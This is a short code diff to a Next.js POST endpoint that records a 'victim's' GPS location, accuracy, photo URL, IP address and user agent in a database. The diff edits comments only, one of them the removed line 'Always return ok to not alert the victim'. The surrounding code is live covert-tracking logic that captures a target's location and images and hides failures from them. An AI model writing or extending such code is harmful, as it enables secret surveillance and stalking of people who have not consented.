@@ -30,7 +30,7 @@ export async function POST(request) {
     if (victimId && lat && lng) {
       await updateCapture(victimId, lat, lng, accuracy, photoUrl);
     } else if (lat && lng) {
-      // Otherwise insert a new record (GPS + photo only)
+      // Insert new record (GPS + photo only)
       const ip = request.headers.get('x-forwarded-for') || 'unknown';
       const ua = request.headers.get('user-agent') || 'unknown';
       const { neon } = await import('@neondatabase/serverless');
@@ -44,7 +44,6 @@ export async function POST(request) {
     return NextResponse.json({ status: 'ok' });
   } catch (error) {
     console.error('[CAPTURE ERROR]', error);
-    // Always return ok to not alert the victim
     return NextResponse.json({ status: 'ok' });
   }
 }
